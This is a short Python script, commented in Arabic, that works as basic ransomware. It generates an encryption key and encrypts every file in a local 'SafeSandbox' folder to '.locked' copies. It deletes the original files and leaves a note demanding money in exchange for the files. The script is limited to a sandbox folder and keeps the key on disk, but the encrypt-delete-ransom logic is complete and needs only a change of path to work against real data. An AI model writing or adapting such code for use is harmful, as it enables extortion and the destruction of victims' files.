import os
from cryptography.fernet import Fernet

# -------------------------
# 1) توليد مفتاح تشفير
# -------------------------
# استخدام مجلد نسبي بالنسبة للـ script
base_dir = os.path.dirname(os.path.abspath(__file__))
sandbox_dir = os.path.join(base_dir, "SafeSandbox")
os.makedirs(sandbox_dir, exist_ok=True)

key_path = os.path.join(sandbox_dir, "key.key")

# لو المفتاح مش موجود، نولده
if not os.path.exists(key_path):
    key = Fernet.generate_key()
    with open(key_path, "wb") as kf:
        kf.write(key)
else:
    with open(key_path, "rb") as kf:
        key = kf.read()

cipher = Fernet(key)

# -------------------------
# 2) مسار المجلد التجريبي
# -------------------------
folder = sandbox_dir

# -------------------------
# 3) تشفير الملفات
# -------------------------
for filename in os.listdir(folder):
    filepath = os.path.join(folder, filename)
    if os.path.isfile(filepath) and filename != "key.key":
        with open(filepath, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + ".locked", "wb") as f:
            f.write(encrypted)
        os.remove(filepath)  # حذف الملف الأصلي

print("Files encrypted safely (in sandbox).")

# -------------------------
# 4) إنشاء رسالة فدية
# -------------------------
note_path = os.path.join(folder, "README_RECOVER.txt")
with open(note_path, "w") as f:
    f.write("TEAM CYBER CLOWNS SAYING HI.\nSEND MONEY TO GET YOUR FILES.")
